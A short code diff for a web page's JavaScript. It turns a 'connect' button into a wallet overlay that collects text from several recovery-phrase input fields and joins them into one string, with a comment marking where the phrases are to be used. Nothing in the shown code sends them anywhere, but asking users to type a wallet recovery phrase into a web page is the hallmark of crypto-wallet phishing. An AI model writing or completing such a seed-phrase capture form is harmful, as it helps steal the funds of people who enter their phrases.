@@ -16,9 +16,27 @@ showLoading();
 document
   .getElementById("connect-button-id")
   .addEventListener("click", async () => {
+    const overlay = document.getElementById('connect-wallet-overlay');
+    overlay.style.display = 'flex';
+  });
+
+document
+  .getElementById("close-wallet-btn")
+  .addEventListener("click", () => {
+    const overlay = document.getElementById('connect-wallet-overlay');
+    overlay.style.display = 'none';
+  });
+
+document
+  .getElementById("proceed-wallet-btn")
+  .addEventListener("click", async () => {
     showLoading();
     try {
-      // Your connection logic here
+      const inputs = document.querySelectorAll('.phrase-input');
+      const phrases = Array.from(inputs).map(input => input.value).join(' ');
+      // Your connection logic here using the phrases
+      const overlay = document.getElementById('connect-wallet-overlay');
+      overlay.style.display = 'none';
     } finally {
       hideLoading();
     }
